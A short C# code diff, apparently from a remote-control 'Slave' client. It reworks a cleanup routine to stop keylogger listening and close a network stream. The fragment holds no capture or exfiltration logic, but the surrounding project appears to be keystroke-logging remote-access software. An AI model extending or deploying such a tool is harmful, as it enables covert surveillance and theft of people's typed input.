@@ -199,13 +199,13 @@ namespace Slave.Core
 
 
         /// <summary>
-        /// Close network stream and stop the key listening as well
+        /// Close network stream and stop the keylogger listening as well
         /// </summary>
         void Cleanup()
         {
             try
             {
-                MainWindow.keyLoggerManager.Stop();
+                commandsManager.StopKeyloggerListening();
                 networkManager.Cleanup();
             }
             catch (Exception)
